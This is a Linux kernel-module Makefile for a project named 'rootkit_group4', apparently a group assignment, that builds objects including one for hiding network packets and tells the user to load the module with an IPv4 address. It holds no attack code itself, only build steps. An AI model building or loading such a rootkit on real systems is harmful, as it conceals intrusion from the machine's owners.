obj-m += rootkit_group4.o
rootkit_group4-y := main.o include.o hide_packet.o
ccflags-y = -std=gnu99 -Wno-declaration-after-statement -DDEBUG

all:	sysmap
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	@echo "*****************************"
	@echo "To load the module use 'insmod rootkit_group4.ko ipv4=###.###.###.###'."
	@echo "For more information please refer to the README file."
	@echo "*****************************"

sysmap:
	./gensysmap.sh
	@echo "Generated sysmap.h"

clean:
	@rm -f sysmap.h
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

